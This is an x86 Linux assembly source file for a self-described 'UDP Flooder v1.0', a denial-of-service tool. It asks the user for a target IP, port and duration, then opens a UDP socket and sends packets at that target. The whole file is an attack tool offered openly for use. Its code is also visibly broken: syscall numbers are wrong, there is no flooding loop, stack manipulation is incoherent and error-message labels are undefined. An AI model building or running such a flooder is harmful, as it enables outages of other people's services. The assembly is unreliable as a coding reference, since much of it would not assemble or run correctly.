section .data                                                                   ; Constant Data
    getIPMsg db 'Enter IP: '                                                   ; Get IP Input
    lenGetIPMsg equ $-getIPMsg                                                 ; Get Length of input

    getPortMsg db 'Enter Port: '                                               ; Get Port Input
    lenGetPortMsg equ $-getPortMsg                                             ; Get Length of input

    getTimeMsg db 'Enter Time: '                                               ; Get Time Input
    lenGetTimeMsg equ $-getTimeMsg                                             ; Get Length of Input

    getBanner db "[Weeke's] -> UDP Flooder v1.0", 0xa                          ; String To Be Printed
    lenGetBanner equ $-getBanner                                               ; Get Length of String

    getTest db 'test message for loop'
    lenGetTest equ $-getTest

    getCompleted db 'UDP flood completed!'
    lenGetCompleted equ $-getCompleted

section .bss                                                                    ; Variable Data
    internet_protocol resb 16
    port resb 6
    time resb 25

section .text
    global _start

_start:                                                                         ; User Prompt
    ; Display Banner
    mov edx, lenGetBanner                                                      ; Message Length
    mov ecx, getBanner                                                         ; Message to write
    mov ebx, 1                                                                  ; File Descriptor (stdout)
    mov eax, 4                                                                  ; Call Sys_Write
    int 80h                                                                     ; Call Kernel

    ; Get IP input
    mov eax, 4
    mov ebx, 1                                                                  ; File Descriptor (stdout)
    mov ecx, getIPMsg
    mov edx, lenGetIPMsg
    int 80h                                                                     ; Call Kernal

    ; Read and Store user input for internet_protocol
    mov eax, 3
    mov ebx, 1                                                                  ; File Descriptor (stdout)
    mov ecx, internet_protocol
    mov edx, 16                                                                 ; Stores length of string
    int 80h                                                                     ; Call Kernal

    ; Get Port Input
    mov eax, 4
    mov ebx, 1                                                                  ; File Descriptor (stdout)
    mov ecx, getPortMsg
    mov edx, lenGetPortMsg
    int 80h                                                                     ; Call Kernal

    ; Read and Store user input for Port
    mov eax, 3
    mov ebx, 0
    mov ecx, port
    mov edx, 5                                                                  ; Stores length of string
    int 80h                                                                     ; Call Kernal

    ; Get Time Input
    mov eax, 4
    mov ebx, 1                                                                  ; File Descriptor (stdout)
    mov ecx, getTimeMsg
    mov edx, lenGetTimeMsg
    int 80h                                                                     ; Call Kernal

    ; Read and Store user input for Time
    mov eax, 3
    mov ebx, 2
    mov ecx, time
    mov edx, 25                                                                 ; Stores length of string
    int 80h                                                                     ; Call Kernal

    ; Craft UDP Packet
    ; Create socket
    ; Socket syscall: socket(int domain, int type, int protocol)
    ; Domain: AF_INET (IPv4)
    ; Type: SOCK_DGRAM (UDP)
    ; Protocol: 0 (default protocol for UDP)
    mov eax, 102        ; Socket syscall number for socket
    mov ebx, 2          ; AF_INET
    mov ecx, 2          ; SOCK_DGRAM
    xor edx, edx        ; Protocol (0 for default protocol)
    int 0x80            ; Call kernel

    ; Check if socket creation was successful
    test eax, eax       ; Check if the socket descriptor is valid
    js socket_error     ; If error, jump to socket_error

    ; Prepare destination address structure (sockaddr_in)
    ; This structure holds the IP address and port number of the destination
    ; We already have the IP address in 'internet_protocol' and port number in 'port'
    ; We need to convert the IP address from string to network byte order
    ; and set the port number
    mov esi, internet_protocol       ; Load IP address string
    push dword 2                     ; Set sin_family to AF_INET
    pop dword [esp]                  ; Put the value at the top of the stack into sin_family
    movzx eax, word [port]           ; Load port number
    push eax                         ; Push port number onto the stack
    push word 0                      ; Zero out the next 2 bytes (sin_zero)
    mov edi, esp                     ; Save pointer to sockaddr_in structure in edi

    ; Convert IP address string to network byte order (IPv4)
    push edi                         ; Push pointer to sockaddr_in structure
    push esi                         ; Push pointer to IP address string
    call inet_addr                   ; Call inet_addr to convert IP address to network byte order
    mov dword [esp], eax             ; Replace IP address string with converted IP address

    ; Assemble the UDP packet
    ; Prepare the UDP header
    ; UDP header format:
    ; Source port (2 bytes), Destination port (2 bytes), Length (2 bytes), Checksum (2 bytes)
    ; We already have the source port in 'port' and destination port in 'port'
    ; Length: Total length of UDP packet including header (UDP header + UDP data)
    ; Checksum: Optional, can be left as 0 for simplicity

    ; Load the destination port
    movzx ax, word [port]            ; Load destination port

    ; Prepare UDP header
    mov word [edi+2], ax             ; Set destination port in the UDP header (offset 2 bytes from start)
    mov word [edi], ax               ; Set source port (same as destination port in this case)
    mov word [edi+4], 8              ; Length of UDP header + data (8 bytes in this case)
    xor eax, eax                     ; Clear eax for checksum calculation (not implemented)

    ; Send the UDP packet
    ; Sendto syscall: sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen)
    mov eax, 16                      ; Sendto syscall number
    mov ebx, eax                     ; Socket descriptor
    lea ecx, [edi]                   ; Pointer to the UDP packet buffer
    mov edx, 8                       ; Length of UDP packet (UDP header + data)
    push edx                         ; Push length onto the stack
    mov edx, esp                     ; Pointer to length (in stack)
    push edi                         ; Push pointer to destination address structure
    push edx                         ; Push pointer to length
    push ebx                         ; Push socket descriptor
    mov ecx, esp                     ; Pointer to arguments
    xor edx, edx                     ; Clear edx (no flags)
    int 0x80                         ; Call kernel

    ; Check if sendto was successful
    test eax, eax                    ; Check if return value (bytes sent) is valid
    js sendto_error                  ; If error, jump to sendto_error

    ; Close the socket
    ; Close syscall: close(int fd)
    mov eax, 6                        ; Close syscall number
    int 0x80                          ; Call kernel

    ; Display Completed UDP Flood
    mov edx, lenGetCompleted          ; Message Length
    mov ecx, getCompleted             ; Message to write
    mov ebx, 1                        ; File Descriptor (stdout)
    mov eax, 4                        ; Call Sys_Write
    int 80h                           ; Call Kernel

    ; Exit program
    ; Exit syscall: exit(int status)
    mov eax, 1                        ; Exit syscall number
    xor ebx, ebx                      ; Exit status (0 for success)
    int 0x80                          ; Call kernel

socket_error:
    ; Handle socket creation error here
    ; You can print an error message and exit the program

    ; Display error message
    mov edx, lenSocketErrorMsg       ; Length of error message
    mov ecx, socketErrorMsg          ; Pointer to error message
    mov ebx, 1                       ; File descriptor (stdout)
    mov eax, 4                       ; Sys_Write syscall number
    int 0x80                         ; Call kernel

    ; Exit program with error status
    mov eax, 1                       ; Exit syscall number
    mov ebx, 1                       ; Error status
    int 0x80                         ; Call kernel

sendto_error:
    ; Handle sendto error here
    ; You can print an error message and exit the program

    ; Display error message
    mov edx, lenSendtoErrorMsg       ; Length of error message
    mov ecx, sendtoErrorMsg          ; Pointer to error message
    mov ebx, 1                       ; File descriptor (stdout)
    mov eax, 4                       ; Sys_Write syscall number
    int 0x80                         ; Call kernel

    ; Exit program with error status
    mov eax, 1                       ; Exit syscall number
    mov ebx, 1                       ; Error status
    int 0x80                         ; Call kernel

; Helper function to convert IP address string to network byte order (IPv4)
; Prototype: unsigned long inet_addr(const char *cp);
inet_addr:
    push ebx                         ; Save ebx
    mov ebx, esp                     ; Set ebx to point to the address of the IP string
    mov eax, 0x66                    ; inet_addr syscall number
    int 0x80                         ; Call kernel
    pop ebx                          ; Restore ebx
    ret                              ; Return
